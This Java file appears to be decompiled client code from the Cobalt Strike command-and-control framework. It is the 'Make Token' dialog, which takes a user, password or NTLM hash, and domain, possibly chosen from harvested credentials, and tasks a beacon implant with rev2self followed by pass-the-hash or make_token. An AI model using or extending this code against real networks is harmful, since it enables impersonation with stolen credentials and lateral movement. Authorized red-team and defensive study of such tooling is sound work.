package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.browsers.Credentials;
import beacon.TaskBeacon;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;

import java.awt.event.ActionEvent;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JComponent;
import javax.swing.JFrame;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;

import ui.ATextField;

public class MakeTokenDialog implements DialogListener, ListSelectionListener {

    protected JFrame dialog = null;

    protected AggressorClient client = null;

    protected String bid = null;

    protected ATextField user;

    protected ATextField pass;

    protected ATextField domain;

    protected Credentials browser;

    public MakeTokenDialog(AggressorClient aggressorClient, String string) {
        this.client = aggressorClient;
        this.bid = string;
        this.browser = new Credentials(aggressorClient);
        this.browser.setColumns("user, password, realm, note");
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        TaskBeacon taskBeacon = new TaskBeacon(this.client, this.client.getData(), this.client.getConnection(), new String[]{this.bid});
        DialogUtils.openOrActivate(this.client, this.bid);
        taskBeacon.input("rev2self");
        taskBeacon.Rev2Self();
        String str = this.domain.getText();
        if ("".equals(str))
            str = ".";
        if (this.pass.getText().length() == 32) {
            taskBeacon.input("pth " + str + "\\" + this.user.getText() + " " + this.pass.getText());
            taskBeacon.PassTheHash(str, this.user.getText(), this.pass.getText());
        } else {
            taskBeacon.input("make_token " + str + "\\" + this.user.getText() + " " + this.pass.getText());
            taskBeacon.LoginUser(str, this.user.getText(), this.pass.getText());
        }
    }

    public void valueChanged(ListSelectionEvent listSelectionEvent) {
        if (listSelectionEvent.getValueIsAdjusting())
            return;
        this.user.setText((String) this.browser.getSelectedValueFromColumn("user"));
        this.pass.setText((String) this.browser.getSelectedValueFromColumn("password"));
        this.domain.setText((String) this.browser.getSelectedValueFromColumn("realm"));
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog("Make Token", 580, 315);
        this.dialog.addWindowListener(this.browser.onclose());
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        JComponent jComponent = this.browser.getContent();
        this.browser.getTable().getSelectionModel().addListSelectionListener(this);
        this.user = (ATextField) dialogManager.text("user", "User:", 36).get(1);
        this.pass = (ATextField) dialogManager.text("pass", "Password:", 36).get(1);
        this.domain = (ATextField) dialogManager.text("domain", "Domain:", 36).get(1);
        JButton jButton1 = dialogManager.action("Build");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-make-token");
        this.dialog.add(jComponent, "Center");
        this.dialog.add(DialogUtils.stackTwo(dialogManager.layout(), DialogUtils.center(jButton1, jButton2)), "South");
        this.dialog.setVisible(true);
    }
}
